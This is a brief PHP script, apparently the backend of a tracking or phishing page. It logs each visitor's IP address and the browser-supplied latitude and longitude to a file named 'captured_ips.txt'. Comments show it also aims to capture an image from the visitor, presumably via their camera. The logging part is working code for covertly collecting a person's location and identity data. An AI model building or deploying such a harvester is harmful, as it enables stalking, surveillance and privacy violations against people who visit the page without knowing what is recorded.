<?php
$latitude = $_POST['latitude'];
$longitude = $_POST['longitude'];
$ip = $_SERVER['REMOTE_ADDR'];

// Save IP to captured_ips.txt
$ip_file = fopen("captured_ips.txt", "a");
fwrite($ip_file, "IP: " . $ip . " Latitude: " . $latitude . " Longitude: " . $longitude . "\n");
fclose($ip_file);

// Attempt to capture an image (this part is tricky and might not work directly)
// You'd typically need JavaScript and a server-side script to handle image capture.

echo "Location and IP saved.";
?>
